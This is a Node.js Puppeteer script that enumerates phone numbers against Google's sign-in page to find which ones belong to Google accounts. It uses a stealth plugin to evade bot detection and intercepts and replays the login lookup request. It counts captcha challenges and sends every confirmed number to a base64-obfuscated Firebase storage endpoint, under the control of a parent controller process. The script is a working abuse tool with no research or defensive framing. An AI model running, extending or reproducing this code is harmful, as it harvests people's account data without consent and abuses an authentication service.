const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')

const args = process.argv.slice(2)

let USER = args[0]

let mConfig = null
let mLoaded = false
let mUrl = null
let mPostData = null
let mHeaders = null
let page = null
let mStart = Date.now()

let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')

puppeteer.use(StealthPlugin())


process.on('message', async (data) => {
    try {
        let json = (typeof data === 'string') ? JSON.parse(data) : data
        if (json.t == 1) {
            mConfig = json
        } else if (json.t == 2) {
            let running = mConfig != null
            process.send({ t: 3, s: 'controller_status', d: { t:2, s:running, u:USER, a:parseInt((Date.now()-mStart)/1000) } })
        }
    } catch (error) {}
})


startBrowser()


setInterval(async () => {
    await pageReload()
}, 3600000)


async function startBrowser() {
    try {
        let browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-notifications',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ]
        })

        page = (await browser.pages())[0]

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

        await page.setRequestInterception(true)

        page.on('request', async request => {
            try {
                let url = request.url()
                if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e') && !url.endsWith('request=manually')) {
                    mUrl = url
                    mHeaders = request.headers()
                    mPostData = request.postData()
                    
                    let contentType = 'application/json; charset=utf-8'
                    let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')

                    request.respond({
                        ok: true,
                        status: 200,
                        contentType,
                        body: output,
                    })
                } else {
                    request.continue()
                }
            } catch (error) {
                request.continue()
            }
        })

        console.log('Browser Load Success')

        await loadLoginPage()

        mLoaded = true

        console.log('Page Load Success')
        
        await foundLoginNumber()
    } catch (error) {
        console.log('Browser Error: '+error)
    }
}


async function foundLoginNumber() {
    while (true) {
        if (mConfig) {
            mStart = Date.now()
            try {
                let prev = mConfig.n
                let target = mConfig.s
                let found = 0
                let captcha = 0
                let recaptcha = 0
                let other = 0
                for (let i = 0; i < target; i++) {
                    if (prev != mConfig.n) {
                        i = 0
                        other = 0
                        found = 0
                        captcha = 0
                        recaptcha = 0
                        target = mConfig.s
                    }

                    let number = mConfig.n+i

                    try {
                        let status = await getLoginStatus('+'+number)

                        if (status == 0) {
                            status = await getLoginStatus('+'+number)
                        }
                        if (status == 0) {
                            status = await getLoginStatus('+'+number)
                        }
                        if (status == 5) {
                            await delay(2000)
                            status = await getLoginStatus('+'+number)
                        }

                        if (status == 1) {
                            found++
                            await saveNumber(mConfig.u, mConfig.k, number)
                        } else if (status == 2) {
                            recaptcha++
                        } else if (status == 5) {
                            captcha++
                        } else if (status == 0 || status == 3) {
                            console.log(status, number)
                            other++
                        }
                    } catch (error) {}

                    await delay(Math.min(mConfig.d, 2000))
                }

                process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:found, r:recaptcha, c:captcha, o:other } })
            } catch (error) {}

            mConfig = null
        } else {
            await delay(1000)
        }
    }
}


async function getLoginStatus(number) {
    try {
        for (let i = 0; i < 60; i++) {
            if (mLoaded) {
                break
            }
            await delay(500)
        }

        if (!mLoaded) {
            return 0
        }

        mUrl = null
        mHeaders = null
        mPostData = null
        await page.evaluate((number) => {
            document.querySelector('input#identifierId').value = number
            document.querySelector('#identifierNext').click()
        }, number)
        let url = null
        let headers = null
        let postData = null
        for (let i = 0; i < 150; i++) {
            if (mUrl && mPostData && mHeaders) {
                url = mUrl
                headers = mHeaders
                postData = mPostData
                break
            }
            await delay(100)
        }
        
        mUrl = null
        mHeaders = null
        mPostData = null
        
        if (url && postData && headers) {
            let data = await page.evaluate(async (u, h, p) => {
                let res = await fetch(u, {
                    method: 'POST',
                    headers: h,
                    body: p
                })

                return await res.text()
            }, url+(url.endsWith('&') ? '': '&')+'request=manually', headers, postData)

            let temp = data.substring(data.indexOf('[['), data.lastIndexOf(']]')-2)
            temp = temp.substring(0, temp.lastIndexOf(']]')+2)

            let json = JSON.parse(temp)[0]
            if (json[1] == 'MI613e') {
                let value = JSON.parse(json[2])
                if (value[21]) {
                    let values = JSON.stringify(value[21])
                    if (values.includes('/v3/signin/challenge/pwd') || values.includes('/v3/signin/rejected')) {
                        return 1
                    } else if (values.includes('/v3/signin/challenge/recaptcha')) {
                        return 2
                    }
                    return 3
                } else if (value[18] && value[18][0]) {
                    return 5
                } else {
                    return 4
                }
            }
        }
    } catch (error) {}

    return 0
}

async function pageReload() {
    mLoaded = false
    console.log('Page Reloading...')
    await loadLoginPage()
    console.log('Page Reload Success')
    mLoaded = true
}


async function loadLoginPage() {
    for (let i = 0; i < 3; i++) {
        try {
            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
            await delay(500)
                await page.evaluate(() => {
                let root = document.querySelector('div[class="kPY6ve"]')
                if (root) {
                    root.remove()
                }
                root = document.querySelector('div[class="Ih3FE"]')
                if (root) {
                    root.remove()
                }
            })
            break
        } catch (error) {}
    }
}

async function saveNumber(user, key, number) {
    try {
        await fetch(STORAGE+encodeURIComponent('number/'+user+'/'+key+'/'+number), {
            method: 'POST',
            body: ''
        })
    } catch (error) {}
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('utf-8')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
